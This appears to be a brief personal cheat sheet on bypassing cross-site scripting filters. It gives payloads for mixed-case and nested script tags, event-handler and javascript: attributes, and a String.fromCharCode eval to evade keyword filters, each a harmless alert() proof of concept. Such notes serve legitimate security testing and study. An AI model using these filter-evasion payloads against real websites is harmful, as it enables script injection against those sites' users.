# Casing
Very easy bypass, just change the casing:

```html
<sCrIPt>alert('e6206710-c2c4-4704-869e-888e9947486e')</sCrIPt>
```

If the script tag is only removed once, you can add a script tag inside a script tag to bypass

# Script inside script ()

```html
<sCr<script>IPt>alert('e6206710-c2c4-4704-869e-888e9947486e')</sCr</script>IPt>
```

# Other Tags

- `<a>` (or `<div>`)tag and the following events: `onmouseover`, `onmouseout`,`onmousemove`, `onclick`
- `<a href='javascript:alert(1)' ...`
- `<img src=zzz onerror='alert(1)'/>`

```ad-important
Pay attention to your adblocker, it can block a lot of these and you won't see XSS (namely the `<img>` one.)
```

# Tag works, filter on words

```html
<script>eval(String.fromCharCode(97,108,101,114,116))(1)</script>
```

